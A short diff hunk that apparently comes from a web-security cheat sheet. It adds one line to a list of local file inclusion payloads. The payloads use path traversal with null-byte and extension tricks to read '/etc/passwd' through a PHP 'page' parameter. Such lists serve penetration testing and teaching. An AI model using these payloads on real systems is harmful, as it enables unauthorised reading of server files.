@@ -576,6 +576,7 @@ LFI / RFI
 ```
 # Append NULL bytes (prevent .ext concat to the end by application)
 http://example.com/index.php?page=../../../etc/passwd%00
+http://example.com/index.php?page=../../../etc/passwd.html
 http://example.com/index.php?page=../../../etc/passwd%en
 http://example.com/index.php?page=../../../etc/passwd%00%en
 ```
